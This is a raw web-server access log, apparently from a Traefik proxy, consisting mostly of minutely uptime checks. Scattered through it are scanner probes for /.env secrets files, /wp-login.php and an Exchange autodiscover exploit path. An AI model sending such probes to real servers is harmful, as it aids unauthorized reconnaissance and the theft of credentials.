167.71.120.76 - - [17/Dec/2023:15:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1650 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:15:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1651 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:15:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1652 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:15:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1653 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:15:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1654 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:15:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1655 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:15:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1656 "www@docker" "http://172.18.0.9:80" 1ms
185.224.128.191 - - [17/Dec/2023:15:58:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1657 "web-to-websecure@internal" "-" 0ms
45.79.163.53 - - [17/Dec/2023:15:58:57 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1658 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:15:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1659 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:15:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1660 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1661 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1662 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1663 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1664 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1665 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1666 "www@docker" "http://172.18.0.9:80" 0ms
185.87.122.40 - - [17/Dec/2023:16:03:16 +0000] "GET /wp-login.php HTTP/1.1" 301 17 "-" "-" 1667 "web-to-websecure@internal" "-" 0ms
185.87.122.40 - - [17/Dec/2023:16:03:17 +0000] "GET /wp-login.php HTTP/1.1" 404 19 "-" "-" 1668 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1669 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1670 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1671 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1672 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1674 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:16:05:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1675 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1676 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1677 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1678 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1679 "www@docker" "http://172.18.0.9:80" 1ms
118.193.59.10 - - [17/Dec/2023:16:08:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1680 "-" "-" 0ms
118.193.59.10 - - [17/Dec/2023:16:08:21 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1681 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1682 "www@docker" "http://172.18.0.9:80" 0ms
118.193.59.10 - - [17/Dec/2023:16:08:24 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1683 "-" "-" 0ms
118.193.59.10 - - [17/Dec/2023:16:08:26 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1684 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:16:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1685 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1686 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1687 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1688 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1689 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1690 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1691 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1692 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1693 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1694 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1695 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1696 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1697 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1698 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1699 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1700 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1701 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:16:16:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1702 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1703 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1704 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1705 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1706 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1707 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1708 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1709 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1710 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1711 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1712 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1713 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1714 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [17/Dec/2023:16:23:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1715 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [17/Dec/2023:16:23:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1716 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1717 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1718 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1719 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1720 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1721 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1722 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1723 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1724 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1725 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1726 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1727 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1728 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1729 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1730 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1731 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1732 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1733 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1734 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1735 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1736 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1737 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1738 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1739 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1740 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1741 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1742 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1743 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1744 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1745 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1746 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1747 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1748 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1749 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1750 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1751 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1752 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1753 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1754 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1755 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1756 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1757 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1758 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1759 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1760 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.173 - - [17/Dec/2023:16:45:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1761 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1762 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1763 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1764 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1765 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1766 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1767 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1768 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1769 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [17/Dec/2023:16:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1770 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1771 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1772 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1773 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1774 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1775 "www@docker" "http://172.18.0.9:80" 1ms
159.203.224.26 - - [17/Dec/2023:16:52:12 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 1776 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1777 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1778 "www@docker" "http://172.18.0.9:80" 0ms
185.236.231.187 - - [17/Dec/2023:16:53:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1779 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [17/Dec/2023:16:53:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1780 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [17/Dec/2023:16:53:12 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1781 "-" "-" 0ms
185.236.231.187 - - [17/Dec/2023:16:53:12 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 1782 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1783 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1784 "www@docker" "http://172.18.0.9:80" 0ms
71.6.134.230 - - [17/Dec/2023:16:54:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1785 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:16:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1786 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1787 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1788 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1789 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1790 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1791 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:16:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1792 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1793 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1794 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:16:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1795 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:16:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1796 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:16:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1797 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1798 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1799 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1800 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1801 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1802 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1803 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1804 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1805 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1806 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1807 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1808 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1809 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1810 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1811 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1812 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1813 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:17:08:09 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1814 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1815 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1816 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1817 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1818 "www@docker" "http://172.18.0.9:80" 0ms
167.94.146.56 - - [17/Dec/2023:17:09:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1819 "web-to-websecure@internal" "-" 0ms
167.94.146.56 - - [17/Dec/2023:17:09:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1820 "web-to-websecure@internal" "-" 0ms
167.94.146.56 - - [17/Dec/2023:17:09:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1821 "-" "-" 0ms
172.104.210.105 - - [17/Dec/2023:17:09:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1822 "-" "-" 0ms
172.104.11.46 - - [17/Dec/2023:17:10:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1823 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1824 "www@docker" "http://172.18.0.9:80" 0ms
71.6.134.230 - - [17/Dec/2023:17:10:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1825 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:17:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1826 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1827 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1828 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1829 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1830 "www@docker" "http://172.18.0.9:80" 0ms
205.210.31.39 - - [17/Dec/2023:17:13:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1831 "web-to-websecure@internal" "-" 0ms
205.210.31.39 - - [17/Dec/2023:17:13:01 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 1832 "www@docker" "http://172.18.0.9:80" 41ms
159.203.109.206 - - [17/Dec/2023:17:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1833 "www@docker" "http://172.18.0.9:80" 0ms
